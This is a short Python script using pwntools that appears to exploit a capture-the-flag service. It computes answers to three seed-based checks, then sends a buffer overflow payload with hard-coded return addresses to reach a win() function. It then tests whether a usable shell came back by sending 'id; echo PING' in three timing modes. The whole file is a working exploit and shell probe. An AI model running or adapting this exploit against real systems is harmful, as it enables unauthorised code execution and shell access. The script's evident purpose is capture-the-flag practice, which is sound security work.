#!/usr/bin/env python3
# probe: does win() actually leave us a usable shell?
import sys, re, time
from pwn import *
context.log_level = 'error'
M = 0xffffffff
def rol32(v,n):
    v &= M
    return ((v << n) | (v >> (32-n))) & M
host, port = sys.argv[1], int(sys.argv[2])

def run(mode):
    io = remote(host, port)
    d = io.recvuntil(b'A: ', timeout=8)
    m = re.search(rb'seed\s+([0-9a-fA-F]{1,8})', d)
    if not m:
        print('NO SEED'); io.close(); return
    K = int(m.group(1),16) & M
    x1 = (K*0x9e3779b9)&M
    io.sendline(('%x'%x1).encode())
    io.recvuntil(b'B: ', timeout=8)
    x2 = (rol32(x1,7)^0x5a5a5a5a)&M
    io.sendline(('%x'%x2).encode())
    ch = io.recvuntil(b'C: ', timeout=8)
    mt = re.search(rb'idx\s+(-?\d+)\s+(-?\d+)', ch)
    i1,i2 = int(mt.group(1)), int(mt.group(2))
    hexes = re.findall(rb'([0-9a-fA-F]{8})', ch[:mt.start()])
    tbl = [int(x,16) for x in hexes][:16]
    x3 = tbl[i1]^tbl[i2]
    io.sendline(('%x'%x3).encode())
    gw = rol32(x2^x3^0x13371337,7)&M
    io.recvuntil(b'D> ', timeout=8)
    payload = b'A'*0x40 + b'B'*8 + p64(0x4019ad) + p64(gw) + p64(0x4019c5)
    io.send(payload)
    out = b''
    if mode == 'wait':
        time.sleep(0.5)
        io.sendline(b'id; echo PING')
    elif mode == 'now':
        io.sendline(b'id; echo PING')
    elif mode == 'slow':
        for c in [b'id\n', b'echo PING\n']:
            time.sleep(0.8); io.send(c)
    t0=time.time()
    while time.time()-t0 < 5:
        try:
            dd = io.recv(timeout=1)
        except EOFError:
            out += b'<EOF>'
            break
        if not dd: break
        out += dd
    print('=== mode %s: %r' % (mode, out))
    io.close()

for mode in ['wait','now','slow']:
    try:
        run(mode)
    except Exception as e:
        print('=== mode %s EXC %r' % (mode, e))
